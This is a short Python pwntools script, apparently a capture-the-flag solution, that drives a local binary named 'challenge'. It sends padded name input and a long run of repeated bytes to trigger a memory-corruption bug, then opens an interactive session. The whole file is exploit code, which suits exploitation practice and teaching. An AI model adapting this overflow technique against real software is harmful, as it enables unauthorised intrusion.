from pwn import *

p  = process('./challenge')

def fill_saves():
    for i in range(5):
        p.recvuntil(b'> ')
        p.sendline(b'2')

p.recvuntil(b'Name: ')
p.sendline(b'A'*16+b'2')

fill_saves()

p.recvuntil(b'> ')
p.sendline(b'3')

p.recvuntil(b'> ')
p.sendline(b'2'*60)

p.recvuntil(b'> ')
p.sendline(b'1')

p.interactive()
